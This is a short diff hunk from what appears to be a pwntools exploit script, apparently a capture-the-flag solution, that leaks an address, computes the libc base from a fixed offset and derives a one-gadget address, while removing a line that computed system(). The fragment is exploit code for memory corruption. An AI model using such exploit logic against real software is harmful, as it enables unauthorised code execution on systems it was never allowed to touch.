@@ -42,7 +42,6 @@ s.sendline(payload)
 
 leak = int(s.recvline()[:14:],16)
 libc_addr = leak - 0x3C49F0
-system = libc_addr + system_offset
 oneshot = libc_addr + 0x46428 
 
 log.info('leak = {}'.format(hex(leak)))
